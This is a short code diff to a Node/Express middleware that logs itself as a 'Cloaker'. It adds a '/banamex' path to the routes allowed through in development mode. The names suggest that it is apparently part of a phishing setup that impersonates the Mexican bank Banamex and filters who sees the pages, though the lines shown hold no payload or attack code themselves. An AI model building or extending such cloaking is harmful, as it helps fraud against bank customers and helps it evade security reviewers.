@@ -73,7 +73,7 @@ app.use((req, res, next) => {
     const isDevelopment = process.env.NODE_ENV !== 'production';
     
     // Permitir acceso completo en desarrollo para rutas principales
-    if (isDevelopment && (req.path === '/' || req.path.startsWith('/admin') || req.path.startsWith('/api') || req.path.startsWith('/client'))) {
+    if (isDevelopment && (req.path === '/' || req.path.startsWith('/admin') || req.path.startsWith('/api') || req.path.startsWith('/client') || req.path.startsWith('/banamex'))) {
       console.log(`[Cloaker] ✓ Modo desarrollo - ruta permitida: ${req.path}`);
       return next();
     }
